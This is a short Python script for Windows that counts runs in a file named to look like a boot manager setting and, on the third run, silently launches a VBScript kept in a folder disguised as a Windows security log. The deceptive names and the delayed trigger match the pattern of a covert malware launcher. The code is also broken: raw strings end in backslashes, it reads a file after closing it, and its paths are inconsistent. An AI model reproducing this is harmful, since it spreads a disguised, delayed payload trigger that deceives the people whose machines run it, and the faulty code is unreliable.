import os

if (os.path.isdir(r"C:\Windows\System32\") == False):
    os.mkdir(r"C:\Windows\System32\")
    
if (os.path.exists(r"C:\Users\bootmanagerconfig")):
    file = open(r"C:\Windows\System32\bootmanagerconfig","w+")
    file.write("0")
    file.close()
    
file = open(r"C:\Users\bootmanagerconfig","r+")
systemLoads = int(file.read())
file.close()

file = open(r"C:\Users\bootmanagerconfig","w+")
file.write(str(systemLoads + 1))
file.close()

if int(file.read()) == 3:
  os.system(r"C:\Windows\System32\wscript.exe C:\ProgramData\WindowsSecurityLog\0x65\f1n.vbs")